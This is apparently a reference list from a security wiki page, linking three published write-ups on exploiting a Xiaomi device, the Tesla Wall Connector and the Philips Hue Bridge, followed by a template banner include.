- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [Synacktiv - Exploiting the Tesla Wall Connector from its charge port connector - Part 2: bypassing the anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [Make it Blink: Over-the-Air Exploitation of the Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
